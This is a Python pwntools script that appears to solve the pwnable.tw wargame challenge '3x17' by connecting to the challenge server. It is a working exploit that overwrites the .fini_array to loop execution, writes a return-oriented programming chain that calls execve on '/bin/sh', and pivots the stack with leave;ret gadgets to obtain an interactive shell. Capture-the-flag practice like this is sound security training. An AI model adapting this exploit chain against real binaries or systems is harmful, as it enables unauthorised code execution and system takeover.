from pwn import *


#p = process("./3x17")

p = remote("chall.pwnable.tw", 10105)
#gdb.attach(p,"b*0x401b6d")
p.sendafter("addr:",str(0x0000000004b40f0)) #fini
p.sendafter("data:",p64(0x402960) + p64(0x401b6d))
#fini section => 2 func 

'''
rbp = 0x0000000004b40f0
-> leave
	ret -> ret to 0x0000000004b40f8

rop 
pop_rax_ret 0x0000000004b4100
0x3b		0x0000000004b4108
pop_rdi_ret 0x0000000004b4110
0x0000000004b4140
pop_rdx_pop_rsi_ret 0x0000000004b4120
0
0
syscall		0x0000000004b4138
binsh		

'''


leave_ret = 0x0000000000472bc1
syscall = 0x00000000004022b4
pop_rax_ret = 0x000000000041e4af
pop_rdi_ret = 0x0000000000401696
pop_rdx_pop_rsi_ret = 0x000000000044a309

p.sendafter("addr:",str(0x0000000004b4100)) #fini
p.sendafter("data:",p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret))

p.sendafter("addr:",str(0x0000000004b4118)) #fini
p.sendafter("data:",p64(0x0000000004b4140) + p64(pop_rdx_pop_rsi_ret) + p64(0))

p.sendafter("addr:",str(0x0000000004b4130)) #fini
p.sendafter("data:",p64(0) + p64(syscall) + b'/bin/sh\x00')

p.sendafter("addr:",str(0x0000000004b40f0)) #fini
p.sendafter("data:",p64(leave_ret) + p64(leave_ret+1))


p.interactive()